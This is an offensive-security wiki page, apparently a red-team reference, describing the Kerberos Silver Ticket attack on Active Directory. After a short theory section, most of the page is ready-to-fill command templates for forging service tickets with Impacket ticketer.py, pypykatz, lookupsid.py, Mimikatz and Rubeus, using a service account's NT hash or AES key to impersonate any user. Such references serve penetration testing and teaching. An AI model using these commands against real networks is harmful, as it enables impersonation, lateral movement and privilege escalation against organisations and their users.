---
title: "Silver Ticket"
description: Impersonate any user to a service by crafting service tickets
categories: [Active Directory, Lateral Movement]
tags: [Active Direcotory, Kerberos, Silver Ticket, Lateral Movement, Privilege Escalation]
weight: 2
---

## Theory
**Service Tickets (ST)** are encrypted with a password-derived key of the service account associated with the **service principal**. If the password of the service account is known to the attacker, e.g. after a successful Kerberoasting, the attacker can derive the key from the password and craft their own service tickets to authenticate as **any user** to the compromised service principal.

## Linux Perspective
We may use `ticketer.py` from the Impacket suite to craft a silver ticket as any valid domain user.
```bash
# With NT hash
ticketer.py -nthash <nt_hash> -domain-sid <domain_sid> -domain <domain> -spn <SPN> <impersonated_user>
```
```bash
# With AES (128-bit or 256-bit) key
ticketer.py -aesKey <aes_key> -domain-sid <domain_sid> -domain <domain> -spn <SPN> <impersonated_user>
```

{{% alert title="Tip" %}}
If you only have the service account's cleartext password, you can use `pypykatz` to obtain the NT hash.
```bash
pypykatz crypto "<password>"
```
{{% /alert %}}
{{% alert title="Tip" %}}
The domain SID can be obtained using various methods, including `lookupsid.py`:
```bash
lookupsid.py -hashes "ffffffffffffffffffffffffffffffff:<nt_hash>" "<domain>/<username>@<dc_host>" 0
```
{{% /alert %}}

## Windows Perspective
Mimikatz can be used to craft silver tickets on a Windows machines.
- The `<spn_type>` can be any of the following: `cifs`, `http`, `ldap`, `host`, `rpcss`.
```cmd
# with an NT hash
kerberos::golden /domain:<domain> /sid:<domain_sid> /rc4:<nt_hash> /user:<impersonated_user> /target:<target_host> /service:<spn_type> /ptt

# with an AES 128 key
kerberos::golden /domain:<domain> /sid:<domain_sid> /aes128:<aes128_key> /user:<impersonated_user> /target:<target_host> /service:<spn_type> /ptt

# with an AES 256 key
kerberos::golden /domain:<domain> /sid:<domain_sid> /aes256:<aes256_key> /user:<impersonated_user> /target:<target_host> /service:<spn_type> /ptt
```

Alternatively, Rubeus may also be used.
```cmd
# With NT hash
Rubeus.exe silver /rc4:<nt_hash> /user:<impersonated_user> /service:<SPN> /domain:<domain> /sid:<domain_sid>
Rubeus.exe silver /aes128:<aes128_key> /user:<impersonated_user> /service:<SPN> /domain:<domain> /sid:<domain_sid>
Rubeus.exe silver /aes256:<aes256_key> /user:<impersonated_user> /service:<SPN> /domain:<domain> /sid:<domain_sid>
```
